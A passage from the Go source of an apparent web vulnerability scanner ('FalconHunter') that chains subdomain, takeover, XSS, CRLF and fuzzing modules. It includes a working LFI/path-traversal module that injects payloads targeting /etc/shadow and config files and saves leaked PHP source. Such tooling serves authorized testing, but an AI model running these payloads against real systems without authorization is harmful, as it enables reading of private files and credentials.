	"../../../../proc/version",
	"../../../../etc/shadow",
	"../../../../etc/hosts",
	"../../../../etc/issue",
	// Java / Spring
	"../../../../WEB-INF/web.xml",
	"../../../../WEB-INF/classes/application.properties",
}

var lfiSuccessSignatures = []string{
	// *nix /etc/passwd & shadow
	"root:x:0:0",
	"root:!:",
	"daemon:x:",
	"nobody:x:",
	"bin:x:",
	"mail:x:",
	"sshd:x:",
	"/bin/bash",
	"/bin/sh",
	"/sbin/nologin",
	// Windows ini
	"[boot loader]",
	"[fonts]",
	"for 16-bit app support",
	// PHP source
	"<?php",
	"<?=",
	// expect://id output
	"uid=",
	"gid=",
	"groups=",
	// /proc
	"PATH=/",
	"Linux version",
	// Java
	"<web-app",
	"<servlet-class>",
	"spring.datasource",
	"db.password=",
	// Generic binary file disclosure
	"\x7fELF",
}

const (
	lfiBaselineMarker     = "FALCONHUNTER_BASELINE_PROBE_X"
	lfiUserAgent          = "Mozilla/5.0 (FalconHunter LFIScanner)"
	lfiLenDeltaAbsMin     = 200  // bytes
	lfiLenDeltaRelMin     = 0.20 // 20%
	lfiMaxBodyBytes       = 256 * 1024
	lfiSnippetContextChar = 80
)

type lfiBaseline struct {
	status int
	length int
	err    error
}

// lfiHit captures everything needed for triage.
type lfiHit struct {
	URL            string `json:"url"`
	Param          string `json:"param"`
	Payload        string `json:"payload"`
	Method         string `json:"detection"`  // "signature" or "diff"
	Confidence     string `json:"confidence"` // "high" or "medium"
	Status         int    `json:"status"`
	Length         int    `json:"length"`
	LengthDelta    int    `json:"length_delta_vs_baseline"`
	Signature      string `json:"signature_matched,omitempty"`
	Snippet        string `json:"snippet,omitempty"`
	SourceDumpFile string `json:"source_dump_file,omitempty"`
}

// targetParams returns the parameter names to inject into. Prefers suspect
// names from lfiSuspectParams; falls back to all params if none match.
func targetParams(qs url.Values) []string {
	var suspects []string
	for k := range qs {
		if lfiSuspectParams[strings.ToLower(k)] {
			suspects = append(suspects, k)
		}
	}
	if len(suspects) > 0 {
		return suspects
	}
	out := make([]string, 0, len(qs))
	for k := range qs {
		out = append(out, k)
	}
	return out
}

// fetchBaseline replaces `param` with a benign marker and records status+length.
func fetchBaseline(client *http.Client, rawURL, param string) *lfiBaseline {
	u, err := url.Parse(rawURL)
	if err != nil {
		return &lfiBaseline{err: err}
	}
	qs := u.Query()
	newQS := url.Values{}
	for k, v := range qs {
		newQS[k] = v
	}
	newQS.Set(param, lfiBaselineMarker)
	u.RawQuery = newQS.Encode()

	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return &lfiBaseline{err: err}
	}
	req.Header.Set("User-Agent", lfiUserAgent)
	resp, err := client.Do(req)
	if err != nil {
		return &lfiBaseline{err: err}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, lfiMaxBodyBytes))
	return &lfiBaseline{status: resp.StatusCode, length: len(body)}
}

// snippetAround returns a window of context around the first occurrence of sig.
func snippetAround(body []byte, sig string) string {
	idx := bytes.Index(body, []byte(sig))
	if idx < 0 {
		return ""
	}
	start := idx - lfiSnippetContextChar
	if start < 0 {
		start = 0
	}
	end := idx + len(sig) + lfiSnippetContextChar
	if end > len(body) {
		end = len(body)
	}
	s := string(body[start:end])
	// Collapse newlines so it fits on one JSON line
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\r", " ")
	return strings.TrimSpace(s)
}

var base64BodyRe = regexp.MustCompile(`^[A-Za-z0-9+/=\r\n\s]+$`)

// tryDecodePHPFilter checks if the payload was a php://filter base64 sink and
// the response body decodes to plausible source. If so, save it and return the
// dump path.
func tryDecodePHPFilter(payload string, body []byte, outputDir, urlSafe, param string) string {
	if !strings.Contains(payload, "php://filter") || !strings.Contains(payload, "base64-encode") {
		return ""
	}
	cleaned := strings.TrimSpace(string(body))
	if len(cleaned) < 40 {
		return ""
	}
	if !base64BodyRe.MatchString(cleaned) {
		// Sometimes server wraps base64 in HTML — try to extract the longest
		// run of base64-ish characters.
		matches := regexp.MustCompile(`[A-Za-z0-9+/=]{40,}`).FindAll(body, -1)
		if len(matches) == 0 {
			return ""
		}
		// pick the longest
		longest := matches[0]
		for _, m := range matches {
			if len(m) > len(longest) {
				longest = m
			}
		}
		cleaned = string(longest)
	}
	cleaned = strings.NewReplacer("\n", "", "\r", "", " ", "").Replace(cleaned)
	decoded, err := base64.StdEncoding.DecodeString(cleaned)
	if err != nil {
		// try URL-safe variant
		decoded, err = base64.URLEncoding.DecodeString(cleaned)
		if err != nil {
			return ""
		}
	}
	// Plausibility: PHP source, config-ish, or printable text
	if !bytes.Contains(decoded, []byte("<?php")) &&
		!bytes.Contains(decoded, []byte("<?=")) &&
		!bytes.Contains(decoded, []byte("define(")) &&
		!bytes.Contains(decoded, []byte("function ")) &&
		!bytes.Contains(decoded, []byte("class ")) {
		return ""
	}
	dumpDir := filepath.Join(outputDir, "vuln", "lfi-source")
	os.MkdirAll(dumpDir, 0755)
	safePayload := regexp.MustCompile(`[^A-Za-z0-9._-]+`).ReplaceAllString(payload, "_")
	if len(safePayload) > 80 {
		safePayload = safePayload[:80]
	}
	dumpPath := filepath.Join(dumpDir, fmt.Sprintf("%s__%s__%s.txt", urlSafe, param, safePayload))
	os.WriteFile(dumpPath, decoded, 0644)
	return dumpPath
}

func safeHostFragment(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return "unknown"
	}
	frag := u.Host + u.Path
	frag = regexp.MustCompile(`[^A-Za-z0-9._-]+`).ReplaceAllString(frag, "_")
	if len(frag) > 120 {
		frag = frag[:120]
	}
	return strings.Trim(frag, "_")
}

// injectAndCheck sends one (url, param, payload) request and returns a hit if
// either a signature matches OR the response diverges meaningfully from the baseline.
func injectAndCheck(client *http.Client, rawURL, param, payload string, baseline *lfiBaseline, outputDir string) *lfiHit {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	qs := u.Query()
	newQS := url.Values{}
	for k, v := range qs {
		newQS[k] = v
	}
	newQS.Set(param, payload)
	u.RawQuery = newQS.Encode()
	injected := u.String()

	req, err := http.NewRequest("GET", injected, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", lfiUserAgent)
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, lfiMaxBodyBytes))

	hit := &lfiHit{
		URL:     injected,
		Param:   param,
		Payload: payload,
		Status:  resp.StatusCode,
		Length:  len(body),
	}
	if baseline != nil && baseline.err == nil {
		hit.LengthDelta = hit.Length - baseline.length
	}

	// 1) PHP wrapper source disclosure — try decode FIRST when payload uses
	// php://filter, since the raw response is base64 (no signature match).
	if strings.Contains(payload, "php://filter") && strings.Contains(payload, "base64-encode") {
		if dump := tryDecodePHPFilter(payload, body, outputDir, safeHostFragment(rawURL), param); dump != "" {
			hit.Method = "signature"
			hit.Confidence = "high"
			hit.Signature = "php://filter source disclosure"
			hit.SourceDumpFile = dump
			return hit
		}
	}

	// 2) Signature match (high confidence)
	for _, sig := range lfiSuccessSignatures {
		if bytes.Contains(body, []byte(sig)) {
			hit.Method = "signature"
			hit.Confidence = "high"
			hit.Signature = sig
			hit.Snippet = snippetAround(body, sig)
			if dump := tryDecodePHPFilter(payload, body, outputDir, safeHostFragment(rawURL), param); dump != "" {
				hit.SourceDumpFile = dump
				hit.Signature = sig + " (+source dump)"
			}
			return hit
		}
	}

	// 2) Diff-based anomaly (medium confidence). Only if we have a usable
	// baseline and the response is 2xx (avoid flagging stock 403/404 errors).
	if baseline == nil || baseline.err != nil {
		return nil
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil
	}
	if baseline.status != resp.StatusCode {
		return nil
	}
	absDelta := hit.LengthDelta
	if absDelta < 0 {
		absDelta = -absDelta
	}
	rel := 0.0
	if baseline.length > 0 {
		rel = float64(absDelta) / float64(baseline.length)
	}
	if absDelta >= lfiLenDeltaAbsMin && rel >= lfiLenDeltaRelMin {
		hit.Method = "diff"
		hit.Confidence = "medium"
		return hit
	}
	return nil
}

func lfiTestURL(client *http.Client, rawURL string, outputDir string) []lfiHit {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	qs := u.Query()
	if len(qs) == 0 {
		return nil
	}
	params := targetParams(qs)
	var hits []lfiHit

	for _, param := range params {
		baseline := fetchBaseline(client, rawURL, param)
		var paramHit *lfiHit
		for _, payload := range lfiPayloads {
			h := injectAndCheck(client, rawURL, param, payload, baseline, outputDir)
			if h == nil {
				continue
			}
			// Prefer signature hits over diff hits when ranking.
			if paramHit == nil || (h.Confidence == "high" && paramHit.Confidence != "high") {
				cp := *h
				paramHit = &cp
			}
			if h.Confidence == "high" {
				break // strong hit on this param, move on
			}
		}
		if paramHit != nil {
			hits = append(hits, *paramHit)
		}
	}
	return hits
}

func lfiScan(outputFile string, threads, reqTimeout int) {
	lfiURLsFile := filepath.Join(outputFile, "vuln", "lfi-urls.txt")
	outFile := filepath.Join(outputFile, "vuln", "lfi-traversal.txt")
	jsonlFile := filepath.Join(outputFile, "vuln", "lfi-findings.jsonl")

	if !fileExistsNonEmpty(lfiURLsFile) {
		logWarn(red("(-) LFI scanner: " + lfiURLsFile + " not found — run URL collection first"))
		return
	}
	urls, _ := readLines(lfiURLsFile)
	if len(urls) == 0 {
		logInfo(green("(+) LFI scanner: no candidate URLs to test"))
		return
	}

	logInfo(blue(fmt.Sprintf("[*] LFI scanner: testing %d URL(s) with %d payloads (signature + diff)...",
		len(urls), len(lfiPayloads))))

	transport := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: false,
	}
	httpClient := &http.Client{
		Timeout:   time.Duration(reqTimeout) * time.Second,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) > 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	var mu sync.Mutex
	var allHits []lfiHit
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, u := range urls {
		u := u
		wg.Add(1)
		go func() {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			hits := lfiTestURL(httpClient, u, outputFile)
			if len(hits) > 0 {
				mu.Lock()
				allHits = append(allHits, hits...)
				mu.Unlock()
			}
		}()
	}
	wg.Wait()

	os.MkdirAll(filepath.Dir(outFile), 0755)

	// Flat URL list — high-confidence (signature) hits only, for back-compat.
	var flatURLs []string
	for _, h := range allHits {
		if h.Confidence == "high" {
			flatURLs = append(flatURLs, h.URL)
		}
	}
	os.WriteFile(outFile, []byte(strings.Join(flatURLs, "\n")+"\n"), 0644)

	// JSONL — every hit with full evidence.
	if jf, err := os.Create(jsonlFile); err == nil {
		enc := json.NewEncoder(jf)
		for _, h := range allHits {
			_ = enc.Encode(h)
		}
		jf.Close()
	}

	high, medium, sourceDumps := 0, 0, 0
	for _, h := range allHits {
		if h.Confidence == "high" {
			high++
		} else if h.Confidence == "medium" {
			medium++
		}
		if h.SourceDumpFile != "" {
			sourceDumps++
		}
	}

	if high > 0 || medium > 0 {
		logInfo(red(fmt.Sprintf("[!] LFI: %d high-confidence, %d diff-anomaly hits → %s (details: %s)",
			high, medium, outFile, jsonlFile)))
		if sourceDumps > 0 {
			logInfo(red(fmt.Sprintf("[!] LFI: %d PHP source dump(s) → %s/vuln/lfi-source/",
				sourceDumps, outputFile)))
		}
	} else {
		logInfo(green("(+) LFI scanner: no vulnerabilities confirmed"))
	}
}

// ─── TelegramNotify ───────────────────────────────────────────────────────────

type Notifier struct {
	telegramToken  string
	telegramChatID string
	discordWebhook string
	slackWebhook   string
	client         *http.Client
}

func newNotifier(token, chatID, discord, slack string) *Notifier {
	return &Notifier{
		telegramToken:  token,
		telegramChatID: chatID,
		discordWebhook: discord,
		slackWebhook:   slack,
		client:         &http.Client{Timeout: 10 * time.Second},
	}
}

func (n *Notifier) notifyTelegram(message string) {
	placeholders := map[string]bool{
		"your_bot_token": true, "your_chat_id": true,
		"YOUR_BOT_TOKEN": true, "YOUR_CHAT_ID": true,
	}
	if n.telegramToken == "" || n.telegramChatID == "" ||
		placeholders[n.telegramToken] || placeholders[n.telegramChatID] {
		return
	}
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", n.telegramToken)
	payload, _ := json.Marshal(map[string]string{
		"chat_id": n.telegramChatID, "text": message, "parse_mode": "HTML",
	})
	resp, err := n.client.Post(apiURL, "application/json", bytes.NewReader(payload))
	if err != nil {
		logWarn("Telegram notify failed: " + err.Error())
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		logWarn(fmt.Sprintf("Telegram notify failed: %d", resp.StatusCode))
	}
}

func (n *Notifier) notifyDiscord(message string) {
	if n.discordWebhook == "" || n.discordWebhook == "your_discord_webhook" {
		return
	}
	payload, _ := json.Marshal(map[string]string{"content": message})
	resp, err := n.client.Post(n.discordWebhook, "application/json", bytes.NewReader(payload))
	if err == nil {
		resp.Body.Close()
	}
}

func (n *Notifier) notifySlack(message string) {
	if n.slackWebhook == "" || n.slackWebhook == "your_slack_webhook" {
		return
	}
	payload, _ := json.Marshal(map[string]string{"text": message})
	resp, err := n.client.Post(n.slackWebhook, "application/json", bytes.NewReader(payload))
	if err == nil {
		resp.Body.Close()
	}
}

func (n *Notifier) notify(message string) {
	n.notifyTelegram(message)
	n.notifyDiscord(message)
	n.notifySlack(message)
}

// ─── Cleanup ──────────────────────────────────────────────────────────────────

func cleanupOutput(outputFile string, removeFiles, removeDirs bool) {
	logInfo(green("[+] Cleaning up empty files and directories"))

	if removeFiles {
		filepath.Walk(outputFile, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}
			if info.Size() == 0 {
				if err := os.Remove(path); err != nil {
					logError("Failed to remove " + path + ": " + err.Error())
				}
			}
			return nil
		})
	}

	if removeDirs {
		filepath.Walk(outputFile, func(path string, info os.FileInfo, err error) error {
			if err != nil || !info.IsDir() || path == outputFile {
				return nil
			}
			entries, _ := os.ReadDir(path)
			if len(entries) == 0 {
				os.Remove(path)
			}
			return nil
		})
	}
	logInfo(green("[+] Cleanup completed"))
}

// ─── Summary ──────────────────────────────────────────────────────────────────

func generateSummary(outputFile, domainsFile string) {
	countJSONList := func(path string) int {
		data, err := os.ReadFile(path)
		if err != nil {
			return 0
		}
		var list []interface{}
		if err := json.Unmarshal(data, &list); err != nil {
			return 0
		}
		return len(list)
	}

	summary := map[string]interface{}{
		"generated_at":        time.Now().Format("2006-01-02 15:04:05"),
		"domains_file":        domainsFile,
		"subdomains_found":    countLines(filepath.Join(outputFile, "hosts", "subs.txt")),
		"alive_hosts":         countLines(filepath.Join(outputFile, "hosts", "alive-hosts.txt")),
		"total_urls":          countLines(filepath.Join(outputFile, "urls", "all-urls.txt")),
		"js_files":            countLines(filepath.Join(outputFile, "urls", "js-files.txt")),
		"leaked_docs":         countLines(filepath.Join(outputFile, "urls", "leaked-docs.txt")),
		"subdomain_takeovers": countJSONList(filepath.Join(outputFile, "vuln", "takeovers.json")),
	}

	// email vuln count from missing-dmarc.json
	dmarcPath := filepath.Join(outputFile, "vuln", "missing-dmarc.json")
	if data, err := os.ReadFile(dmarcPath); err == nil {
		var results []dmarcResult
		if json.Unmarshal(data, &results) == nil {
			vuln := 0
			for _, r := range results {
				if r.Status == "Vulnerable" {
					vuln++
				}
			}
			summary["email_vuln_domains"] = vuln
		}
	}

	findings := map[string]int{}
	for name, path := range map[string]string{
		"nuclei":         filepath.Join(outputFile, "vuln", "nuclei-output.txt"),
		"nuclei_dast":    filepath.Join(outputFile, "vuln", "nuclei-dast-output.txt"),
		"dalfox_xss":     filepath.Join(outputFile, "vuln", "dalfox-xss.txt"),
		"open_redirects": filepath.Join(outputFile, "vuln", "open-redirects.txt"),
		"cors":           filepath.Join(outputFile, "vuln", "cors.txt"),
		"crlf":           filepath.Join(outputFile, "vuln", "crlf.txt"),
		"secrets":        filepath.Join(outputFile, "vuln", "secrets.txt"),
		"403_bypass":     filepath.Join(outputFile, "vuln", "403-bypass.txt"),
		"lfi_urls":       filepath.Join(outputFile, "vuln", "lfi-urls.txt"),
		"ffuf":           filepath.Join(outputFile, "vuln", "ffuf-output.txt"),
		"api_endpoints":  filepath.Join(outputFile, "vuln", "api-endpoints.txt"),
		"waf":            filepath.Join(outputFile, "vuln", "waf.txt"),
	} {
		if c := countLines(path); c > 0 {
			findings[name] = c
		}
	}
	summary["findings"] = findings

	out := filepath.Join(outputFile, "summary.json")
	data, _ := json.MarshalIndent(summary, "", "  ")
	os.WriteFile(out, data, 0644)

	logInfo(green("[+] Summary saved → " + out))
	logInfo(green(fmt.Sprintf("    Subs: %v | Alive: %v | URLs: %v | Takeovers: %v",
		summary["subdomains_found"], summary["alive_hosts"],
		summary["total_urls"], summary["subdomain_takeovers"])))
}

// ─── Phase runner ─────────────────────────────────────────────────────────────

func runPhase(state *ScanState, name string, fn func()) {
	if state != nil && state.isDone(name) {
		logInfo(skyBlue("(i) Skipping completed phase: " + name))
		return
	}
	func() {
		defer func() {
			if r := recover(); r != nil {
				logError(red(fmt.Sprintf("Failed during phase %s: %v", name, r)))
			}
		}()
		fn()
	}()
	if state != nil {
		state.markDone(name)
	}
}

// ─── CLI flags ────────────────────────────────────────────────────────────────

type Args struct {
	domains     string
	single      string
	output      string
	config      string
	runAll      bool
	skip        string
	resume      bool
	email       string
	checkTools  bool
	update      bool
	cleanupOnly bool
	nuclei      bool
	ffuf        bool
	wordlist    string
	cors        bool
	crlf        bool
	dirsearch   bool
	dirsearchWL string
	bypass403   bool
	api         bool
	apiWordlist string
	xss         bool
	redirect    bool
	secrets     bool
	waf         bool
	screenshot  bool
	params      bool
	lfi         bool
}

func parseArgs() Args {
	var a Args
	flag.StringVar(&a.domains, "d", "", "Path to file containing list of domains")
	flag.StringVar(&a.domains, "domains", "", "Path to file containing list of domains")
	flag.StringVar(&a.single, "s", "", "Single target domain")
	flag.StringVar(&a.single, "single", "", "Single target domain")
	flag.StringVar(&a.output, "o", "", "Output directory name")
	flag.StringVar(&a.output, "output", "", "Output directory name")
	flag.StringVar(&a.config, "c", "config.yaml", "Path to config file")
	flag.StringVar(&a.config, "config", "config.yaml", "Path to config file")
	flag.BoolVar(&a.runAll, "all", false, "Enable ALL optional modules")
	flag.StringVar(&a.skip, "skip", "", "Comma-separated modules to skip with --all")
	flag.BoolVar(&a.resume, "resume", false, "Resume an interrupted scan")
	flag.StringVar(&a.email, "e", "", "Email for Auth0 misconfig test")
	flag.StringVar(&a.email, "email", "", "Email for Auth0 misconfig test")
	flag.BoolVar(&a.checkTools, "check-tools", false, "Check required/optional CLI tools and exit")
	flag.BoolVar(&a.update, "up", false, "Update FalconHunter to the latest version and exit")
	flag.BoolVar(&a.update, "update", false, "Update FalconHunter to the latest version and exit")
	flag.BoolVar(&a.cleanupOnly, "cleanup-only", false, "Run only cleanup on existing output directory")
	flag.BoolVar(&a.nuclei, "nuclei", false, "Run Nuclei scans (optional)")
	flag.BoolVar(&a.ffuf, "ffuf", false, "Run ffuf directory fuzzing (optional)")
	flag.StringVar(&a.wordlist, "wordlist", "", "Wordlist for ffuf")
	flag.BoolVar(&a.cors, "cors", false, "Run CORS misconfiguration scan")
	flag.BoolVar(&a.crlf, "crlf", false, "Run CRLF injection scan")
	flag.BoolVar(&a.dirsearch, "dirsearch", false, "Run directory discovery with dirsearch")
	flag.StringVar(&a.dirsearchWL, "dirsearch-wordlist", "", "Wordlist for dirsearch")
	flag.BoolVar(&a.bypass403, "403", false, "Run 403 bypass checks")
	flag.BoolVar(&a.api, "api", false, "Run API endpoint discovery")
	flag.StringVar(&a.apiWordlist, "api-wordlist", "", "Wordlist for API discovery")
	flag.BoolVar(&a.xss, "xss", false, "Test XSS parameters with dalfox")
	flag.BoolVar(&a.redirect, "redirect", false, "Test open redirect parameters")
	flag.BoolVar(&a.secrets, "secrets", false, "Extract secrets from JS files")
	flag.BoolVar(&a.waf, "waf", false, "Detect WAFs with wafw00f")
	flag.BoolVar(&a.screenshot, "screenshot", false, "Capture screenshots with gowitness")
	flag.BoolVar(&a.params, "params", false, "Discover hidden parameters with arjun")
	flag.BoolVar(&a.lfi, "lfi", false, "Test LFI/path-traversal payloads")
	flag.Parse()
	return a
}

// ─── main ─────────────────────────────────────────────────────────────────────

func main() {
	args := parseArgs()

	if args.update {
		updateTool()
		return
	}

	if args.checkTools {
		checkTools()
		return
	}

	fmt.Print(banner)

	// --all: enable every optional module
	if args.runAll {
		skipSet := make(map[string]bool)
		for _, m := range strings.Split(args.skip, ",") {
			if m = strings.TrimSpace(m); m != "" {
				skipSet[m] = true
			}
		}
		if !skipSet["nuclei"] {
			args.nuclei = true
		}
		if !skipSet["ffuf"] {
			args.ffuf = true
		}
		if !skipSet["cors"] {
			args.cors = true
		}
		if !skipSet["crlf"] {
			args.crlf = true
		}
		if !skipSet["dirsearch"] {
			args.dirsearch = true
		}
		if !skipSet["403"] {
			args.bypass403 = true
		}
		if !skipSet["api"] {
			args.api = true
		}
		if !skipSet["xss"] {
			args.xss = true
		}
		if !skipSet["redirect"] {
			args.redirect = true
		}
		if !skipSet["secrets"] {
			args.secrets = true
		}
		if !skipSet["waf"] {
			args.waf = true
		}
		if !skipSet["screenshot"] {
			args.screenshot = true
		}
		if !skipSet["params"] {
			args.params = true
		}
		if !skipSet["lfi"] {
			args.lfi = true
		}
	}

	// --single: write to temp file
	var singleTmp string
	if args.single != "" && args.domains == "" {
		tmp, err := os.CreateTemp("", "falcon-single-*.txt")
		if err != nil {
			logError(red("Failed to create temp file: " + err.Error()))
			return
		}
		tmp.WriteString(strings.TrimSpace(args.single) + "\n")
		tmp.Close()
		singleTmp = tmp.Name()
		args.domains = singleTmp
	}
	defer func() {
		if singleTmp != "" {
			os.Remove(singleTmp)
		}
	}()

	cfg := loadConfig(args.config)

	// Notifications config — env vars take priority
	telegramToken := strings.TrimSpace(os.Getenv("TELEGRAM_TOKEN"))
	if telegramToken == "" {
		telegramToken = cfg.Telegram.Token
	}
	telegramChatID := strings.TrimSpace(os.Getenv("TELEGRAM_CHAT_ID"))
	if telegramChatID == "" {
		telegramChatID = cfg.Telegram.ChatID
	}
	discordWebhook := strings.TrimSpace(os.Getenv("DISCORD_WEBHOOK_URL"))
	if discordWebhook == "" {
		discordWebhook = cfg.Discord.WebhookURL
	}
	slackWebhook := strings.TrimSpace(os.Getenv("SLACK_WEBHOOK_URL"))
	if slackWebhook == "" {
		slackWebhook = cfg.Slack.WebhookURL
	}
	notifier := newNotifier(telegramToken, telegramChatID, discordWebhook, slackWebhook)

	// cleanup-only mode
	if args.cleanupOnly {
		if args.output == "" {
			logError(red("Error: Output directory (-o) must be specified for cleanup"))
			return
		}
		cleanupOutput(args.output, cfg.Cleanup.RemoveEmptyFiles, cfg.Cleanup.RemoveEmptyDirs)
		notifier.notify("(+) Cleanup process completed")
		return
	}

	// Validate required args
	if args.domains == "" || args.output == "" {
		logError(red("Error: Both domains (-d) and output (-o) must be specified for scanning"))
		return
	}

	outputFile := args.output
	domainsFile := args.domains

	os.MkdirAll(outputFile, 0755)

	var state *ScanState
	if args.resume {
		state = newScanState(outputFile)
	}

	startTime := time.Now().Format("2006-01-02 15:04:05")
	pwd, _ := os.Getwd()
	notifier.notify(fmt.Sprintf("(+) Scan for %s Started at %s\n Path:%s", domainsFile, startTime, pwd))

	// ── Core phases ───────────────────────────────────────────────────────────

	runPhase(state, "dirs", func() {
		makeDirectories(outputFile)
		notifier.notify("(+) Directories created successfully")
	})

	runPhase(state, "subdomains", func() {
		sc := &SubdomainsCollector{domains: domainsFile, outputFile: outputFile}
		sc.subfinderSubs()
		sc.probe()
		notifier.notify("(+) Subdomain collection completed")
	})

	runPhase(state, "email", func() {
		lines, _ := readLines(domainsFile)
		validateDomains(domainsFile, outputFile)
		checkZoneTransfer(lines, outputFile)
		notifier.notify("(+) Email security + zone transfer check completed")
	})

	runPhase(state, "takeovers", func() {
		getCNAME(outputFile)
		testTakeover(outputFile)
		runAuth0(domainsFile, outputFile, args.email)

		takeCount := 0
		takeJSON := filepath.Join(outputFile, "vuln", "takeovers.json")
		if data, err := os.ReadFile(takeJSON); err == nil {
			var list []takeoverEntry
			if json.Unmarshal(data, &list) == nil {
				takeCount = len(list)
			}
		}
		msg := "(+) Subdomain takeover tests completed — no takeovers found"
		if takeCount > 0 {
			msg = fmt.Sprintf("[!] %d subdomain takeover(s) found!", takeCount)
		}
		notifier.notify(msg)
	})

	runPhase(state, "buckets", func() {
		bucketsCLI(outputFile)
		notifier.notify("(+) BucketFinder scan completed")
	})

	runPhase(state, "urls", func() {
		collectURLs(domainsFile, outputFile)
		extractJSFiles(outputFile)
		awsExtractor(outputFile)
		extractDocuments(outputFile)
		extractJSDataWithMantra(outputFile)
		notifier.notify("(+) URL scan completed")
	})

	// ── Optional modules ──────────────────────────────────────────────────────

	type optMod struct {
		name string
		fn   func()
	}
	var optionalModules []optMod

	if args.nuclei {
		optionalModules = append(optionalModules, optMod{"nuclei", func() {
			nr := &NucleiRunner{
				outputFile:  outputFile,
				rateLimit:   cfg.Nuclei.RateLimit,
				bulkSize:    cfg.Nuclei.BulkSize,
				concurrency: cfg.Nuclei.Concurrency,
			}
			nr.basicNuclei()
			nr.dastNuclei()
			notifier.notify("(+) Nuclei scan completed")
		}})
	}

	if args.ffuf {
		optionalModules = append(optionalModules, optMod{"ffuf", func() {
			wl := args.wordlist
			if wl == "" {
				wl = cfg.Ffuf.Wordlist
			}
			threads := cfg.Ffuf.Threads
			if threads == 0 {
				threads = 40
			}
			timeout := cfg.Ffuf.Timeout
			if timeout == 0 {
				timeout = 10
			}
			mc := cfg.Ffuf.MatchCodes
			if mc == "" {
				mc = "200,204,301,302,307,401,403"
			}
			dirFuzz(outputFile, wl, threads, timeout, mc)
			notifier.notify("(+) Directory fuzzing completed")
		}})
	}

	if args.cors {
		optionalModules = append(optionalModules, optMod{"cors", func() {
			corsScan(outputFile)
			notifier.notify("(+) CORS scan completed")
		}})
	}

	if args.crlf {
		optionalModules = append(optionalModules, optMod{"crlf", func() {
			crlfScan(outputFile)
			notifier.notify("(+) CRLF scan completed")
		}})
	}

	if args.dirsearch {
		optionalModules = append(optionalModules, optMod{"dirsearch", func() {
			wl := args.dirsearchWL
			if wl == "" {
				wl = cfg.Dirsearch.Wordlist
			}
			threads := cfg.Dirsearch.Threads
			if threads == 0 {
				threads = 25
			}
			ext := cfg.Dirsearch.Extensions
			if ext == "" {
				ext = "php,html,js,txt,json,xml,bak,zip"
			}
			dirsearchScan(outputFile, wl, threads, ext)
			notifier.notify("(+) dirsearch completed")
		}})
	}

	if args.bypass403 {
		optionalModules = append(optionalModules, optMod{"bypass_403", func() {
			bypass403(outputFile)
			notifier.notify("(+) 403 bypass completed")
		}})
	}

	if args.api {
		optionalModules = append(optionalModules, optMod{"api", func() {
			wl := args.apiWordlist
			if wl == "" {
				wl = cfg.ApiDiscovery.Wordlist
			}
			apiDiscover(outputFile, wl)
			notifier.notify("(+) API discovery completed")
		}})
	}

	if args.xss {
		optionalModules = append(optionalModules, optMod{"xss", func() {
			dalfoxScan(outputFile)
			notifier.notify("(+) Dalfox XSS scan completed")
		}})
	}

	if args.redirect {
		optionalModules = append(optionalModules, optMod{"redirect", func() {
			openRedirectScan(outputFile)
			notifier.notify("(+) Open redirect scan completed")
		}})
	}

	if args.secrets {
		optionalModules = append(optionalModules, optMod{"secrets", func() {
			secretfinderScan(outputFile)
			trufflehogScan(outputFile)
			notifier.notify("(+) Secret scanning completed")
		}})
	}

	if args.waf {
		optionalModules = append(optionalModules, optMod{"waf", func() {
			detectWAF(outputFile)
			notifier.notify("(+) WAF detection completed")
		}})
	}

	if args.screenshot {
		optionalModules = append(optionalModules, optMod{"screenshot", func() {
			captureScreenshots(outputFile)
			notifier.notify("(+) Screenshots captured")
		}})
	}

	if args.params {
		optionalModules = append(optionalModules, optMod{"params", func() {
			discoverParams(outputFile)
			notifier.notify("(+) Parameter discovery completed")
		}})
	}

	if args.lfi {
		optionalModules = append(optionalModules, optMod{"lfi", func() {
			lfiScan(outputFile, 20, 10)
			notifier.notify("(+) LFI/path-traversal scan completed")
		}})
	}

	for _, mod := range optionalModules {
		func() {
			defer func() {
				if r := recover(); r != nil {
					logError(red(fmt.Sprintf("Failed during module %s: %v", mod.name, r)))
					notifier.notify(fmt.Sprintf("(-) %s failed", mod.name))
				}
			}()
			runPhase(state, mod.name, mod.fn)
		}()
	}

	// ── Finalize ──────────────────────────────────────────────────────────────

	generateSummary(outputFile, domainsFile)

	if cfg.Cleanup.Enabled {
		cleanupOutput(outputFile, cfg.Cleanup.RemoveEmptyFiles, cfg.Cleanup.RemoveEmptyDirs)
	}

	fmt.Print(doneBanner)
	notifier.notify("(+) Web Application Vulnerability Scan Completed")
	logInfo("Web Application Vulnerability Scan Completed")
}
